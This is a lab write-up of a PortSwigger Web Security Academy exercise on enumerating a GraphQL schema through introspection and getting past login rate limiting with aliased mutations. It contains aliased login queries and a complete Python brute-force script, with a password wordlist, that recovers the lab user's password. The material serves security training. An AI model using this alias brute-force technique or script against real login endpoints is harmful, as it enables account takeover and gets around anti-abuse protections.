# Bypassing GraphQL brute force protections

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass), you'll learn: Enumerating GraphQL schema, bypassing rate limit via aliases query! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

The user login mechanism for this lab is powered by a GraphQL API. The API endpoint has a rate limiter that returns an error if it receives too many requests from the same origin in a short space of time.

To solve the lab, brute force the login mechanism to sign in as `carlos`. Use the list of [authentication lab passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords) as your password source.

We recommend that you install the InQL extension before attempting this lab. InQL makes it easier to modify GraphQL queries in Repeater.

For more information on using InQL, see [Working with GraphQL in Burp Suite](https://portswigger.net/burp/documentation/desktop/testing-workflow/session-management/working-with-graphql).

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-4/images/Pasted%20image%2020230707144316.png)

**My account page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-4/images/Pasted%20image%2020230707144337.png)

**View source page:**
```html
[...]
<h1>Login</h1>
<section>
    <form class="login-form" onsubmit="gqlLogin(this, event, '/my-account')">
        <label>Username</label>
        <input required type=username name="username" autofocus>
        <label>Password</label>
        <input required type=password name="password">
        <button class=button type=submit> Log in </button>
    </form>
    <script src='/resources/js/gqlUtil.js'></script>
    <script src='/resources/js/loginGql.js'></script>
</section>
[...]
```

When the the form is submitted, it'll invoke function `gqlLogin()`. It's also imported 2 JavaScript files: `/resources/js/gqlUtil.js`, `/resources/js/loginGql.js`.

**`/resources/js/loginGql.js`:**
```js
const OPERATION_NAME = 'login';

const MUTATION = `
    mutation ${OPERATION_NAME}($input: LoginInput!) {
        login(input: $input) {
            token
            success
        }
    }`;

const UNEXPECTED_ERROR = 'Unexpected error while trying to log in'
const INVALID_CREDENTIALS = 'Invalid username or password.'

const getLoginMutation = (username, password) => ({
    query: MUTATION,
    operationName: OPERATION_NAME,
    variables: {
        input: {
            username,
            password
        }
    }
});

const displayErrorMessages = (...messages) => {
    [...]
};

const redirectOnSuccess = (redirectPath) => {
    [...]
};

const gqlLogin = (formElement, event, accountDetailsPath) => {
    event.preventDefault();

    const formData = new FormData(formElement);
    const { username, password } = Object.fromEntries(formData.entries())

    const loginMutation = getLoginMutation(username, password);

    sendQuery(loginMutation, redirectOnSuccess(accountDetailsPath), handleErrors(displayErrorMessages), () => displayErrorMessages(UNEXPECTED_ERROR));
};
```

**This JavaScript will prepare a GraphQL mutation query `login`:**
```graphql
mutation login($input: LoginInput!) {
    login(input: $input) {
        token
        success
    }
}

variables: {
    input: {
        username,
        password
    }
}
```

**`/resources/js/gqlUtil.js`:**
```js
[...]
const sendQuery = (query, onGet, onErrors, onException) => {
    fetch(
            '/graphql/v1',
            {
                method: 'POST',
                headers: {
                    "Content-Type": "application/json",
                    "Accept": "application/json"
                },
                body: JSON.stringify(query)
            }
        )
        .then(response => response.json())
        .then(response => {
            const errors = response['errors'];
            if (errors) {
                onErrors(...errors);
            } else {
                onGet(response['data']);
            }
        })
        .catch(onException);
};
```

This JavaScript has a function `sendQuery`, and it'll send a POST request to the GraphQL endpoint `/graphql/v1`.

**Armed with the GraphQL endpoint, we can try to probe for introspection:**
```graphql
{__schema{queryType{name}}}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-4/images/Pasted%20image%2020230707145102.png)

As you can see, it respond the `queryType`'s `name`, which means introspection query is enabled.

**Hence, we can perform a full introspection query:**
```graphql
query IntrospectionQuery {
    __schema {
        queryType {
            name
        }
        mutationType {
            name
        }
        subscriptionType {
            name
        }
        types {
         ...FullType
        }
        directives {
            name
            description
            args {
                ...InputValue
            }
        }
    }
}

fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
        name
        description
        args {
            ...InputValue
        }
        type {
            ...TypeRef
        }
        isDeprecated
        deprecationReason
    }
    inputFields {
        ...InputValue
    }
    interfaces {
        ...TypeRef
    }
    enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
    }
    possibleTypes {
        ...TypeRef
    }
}

fragment InputValue on __InputValue {
    name
    description
    type {
        ...TypeRef
    }
    defaultValue
}

fragment TypeRef on __Type {
    kind
    name
    ofType {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
            }
        }
    }
}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-4/images/Pasted%20image%2020230707145358.png)

**There's some interesting types, queries, and mutation queries:**

- Type:
    - `BlogPost`, fields `id!`, `image!`, `title!`, `author!`, `date!`, `summary!`, `paragraphs!`
    - `ChangeEmailInput`, fields `email!`
    - `ChangeEmailResponse`, fields `email!`
    - `LoginInput`, input fields `username!`, `password!`
    - `LoginResponse`, fields `token!`, `success!`
- Mutation query:
    - `login(input:{username:<username>,password:<password>})`
    - `changeEmail(input:{email:<email>})`
- Query:
    - `getBlogPost(id:<id>)`
    - `getAllBlogPosts`

**Armed with above information, we can try to get all the blog posts:**
```graphql
query {
    getAllBlogPosts {
        id
        image
        title
        author
        date
        summary
        paragraphs
    }
}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-4/images/Pasted%20image%2020230707150239.png)

However, nothing weird.

**So, we can try to login with the `login` mutation query:**
```graphql
mutation login($input: LoginInput){
    login(input:$input) {
        token
        success
    }
}
```

**Variable:**
```json
{
    "input": {
        "password": "test", 
        "username": "carlos"
    }
}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-4/images/Pasted%20image%2020230707151239.png)

**However, when we sent incorrect credentials to the `login` mutation query after 3 times, it'll response us with an error message:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-4/images/Pasted%20image%2020230707151439.png)

That being said, we're rate limited.

Luckily, we can try to bypass that.

Ordinarily, GraphQL objects can't contain multiple properties with the same name. Aliases enable you to bypass this restriction by explicitly naming the properties you want the API to return. You can use aliases to return multiple instances of the same type of object in one request.

Aliases enable you to bypass this restriction by explicitly naming the properties you want the API to return. You can use aliases to return multiple instances of the same type of object in one request. This helps to reduce the number of API calls needed.

In the example below, the query uses aliases to specify a unique name for both products. This query now passes validation, and the details are returned:

```graphql
#Valid query using aliases

query getProductDetails {
    product1: getProduct(id: "1") {
        id
        name
    }
    product2: getProduct(id: "2") {
        id
        name
    }
}
```

```graphql
#Response to query

{
    "data": {
        "product1": {
            "id": 1,
            "name": "Juice Extractor"
         },
        "product2": {
            "id": 2,
            "name": "Fruit Overlays"
        }
    }
}
```

Many endpoints will have some sort of rate limiter in place to prevent brute force attacks. Some rate limiters work based on the number of HTTP requests received rather than the number of operations performed on the endpoint. Because aliases effectively enable you to send multiple queries in a single HTTP message, they can bypass this restriction.

The simplified example below shows a series of aliased queries checking whether store discount codes are valid. This operation could potentially bypass rate limiting as it is a single HTTP request, even though it could potentially be used to check a vast number of discount codes at once:

```graphql
#Request with aliased queries

query isValidDiscount($code: Int) {
    isvalidDiscount(code:$code){
        valid
    }
    isValidDiscount2:isValidDiscount(code:$code){
        valid
    }
    isValidDiscount3:isValidDiscount(code:$code){
        valid
    }
}
```

**Hence, we can try to bypass rate limiting via aliases:**
```graphql
mutation login {
    login(input:{username:"carlos",password:"123456"}) {
        token
        success
    }
    login2:login(input:{username:"carlos",password:"password"}) {
        token
        success
    }
    login3:login(input:{username:"carlos",password:"12345678"}) {
        token
        success
    }
    login4:login(input:{username:"carlos",password:"qwerty"}) {
        token
        success
    }
    login5:login(input:{username:"carlos",password:"123456789"}) {
        token
        success
    }
}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-4/images/Pasted%20image%2020230707152542.png)

**To automate the process, I'll write a Python script:** (Probably overkilled lol)
```python
#!/usr/bin/env python3
import requests
import json
from time import sleep

class Bruteforcer:
    def __init__(self, url, passwordWordlist):
        self.url = url
        self.passwordWordlist = passwordWordlist
        self.session = requests.Session()

    def prepareLoginMutationQuery(self):
        query = '{"query": "'
        counter = 0
        for password in self.passwordWordlist:
            if counter != 0:
                mutationLoginQuery = 'login'
                mutationLoginQuery += str(counter)
                mutationLoginQuery += ':login(input:{username:\\"carlos\\",password:\\"'
                mutationLoginQuery += password
                mutationLoginQuery += '\\"}){token,success}'
                query += mutationLoginQuery
                counter += 1
            else:
                mutationLoginQuery = 'mutation login {login(input:{username:\\"carlos\\",password:\\"'
                mutationLoginQuery += password
                mutationLoginQuery += '\\"}){token,success}'
                query += mutationLoginQuery
                counter += 1

        query += '}"}'
        return query

    def bruteforce(self, query):
        headers = {
            'Content-Type': 'application/json'
        }
        bruteforceResponse = self.session.post(self.url, data=query, headers=headers)
        print('[*] Sending the login aliases query...')

        if 'true' in bruteforceResponse.text:
            jsonResponse = json.loads(bruteforceResponse.text)
            for login in jsonResponse['data']:
                successValue = jsonResponse['data'][login]['success']
                if successValue == True:
                    passwordIndex = int(login[5:])
                    print('[+] Found the correct password!')
                    print(f'[+] Username: carlos, password: {passwordWordlist[passwordIndex]}')
            return

        if 'You have made too many incorrect login attempts.' in bruteforceResponse.text:
            print('[-] Rate limited!! Please wait 1 minute... (Sleeping 1 minute)')
            sleep(60)
            self.bruteforce(query)
            return

if __name__ == '__main__':
    url = 'https://0a78009404f1fb2f80087b93004d0037.web-security-academy.net/graphql/v1'
    passwordWordlist = ['123456', 'password', '12345678', 'qwerty', '123456789', '12345', '1234', '111111', '1234567', 'dragon', '123123', 'baseball', 'abc123', 'football', 'monkey', 'letmein', 'shadow', 'master', '666666', 'qwertyuiop', '123321', 'mustang', '1234567890', 'michael', '654321', 'superman', '1qaz2wsx', '7777777', '121212', '000000', 'qazwsx', '123qwe', 'killer', 'trustno1', 'jordan', 'jennifer', 'zxcvbnm', 'asdfgh', 'hunter', 'buster', 'soccer', 'harley', 'batman', 'andrew', 'tigger', 'sunshine', 'iloveyou', '2000', 'charlie', 'robert', 'thomas', 'hockey', 'ranger', 'daniel', 'starwars', 'klaster', '112233', 'george', 'computer', 'michelle', 'jessica', 'pepper', '1111', 'zxcvbn', '555555', '11111111', '131313', 'freedom', '777777', 'pass', 'maggie', '159753', 'aaaaaa', 'ginger', 'princess', 'joshua', 'cheese', 'amanda', 'summer', 'love', 'ashley', 'nicole', 'chelsea', 'biteme', 'matthew', 'access', 'yankees', '987654321', 'dallas', 'austin', 'thunder', 'taylor', 'matrix', 'mobilemail', 'mom', 'monitor', 'monitoring', 'montana', 'moon', 'moscow']
    
    bruteforcer = Bruteforcer(url, passwordWordlist)
    query = bruteforcer.prepareLoginMutationQuery()
    bruteforcer.bruteforce(query)
```

```shell
┌[siunam♥Mercury]-(~/ctf/Portswigger-Labs/Testing-GraphQL-APIs)-[2023.07.07|16:38:28(HKT)]
└> python3 bypass_rate_limit.py 
[*] Sending the login aliases query...
[+] Found the correct password!
[+] Username: carlos, password: 112233
```

**Let's login as user `carlos`!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-4/images/Pasted%20image%2020230707163928.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-4/images/Pasted%20image%2020230707163942.png)

# What we've learned:

1. Enumerating GraphQL Schema
2. Bypassing Rate Limit Via Aliases Query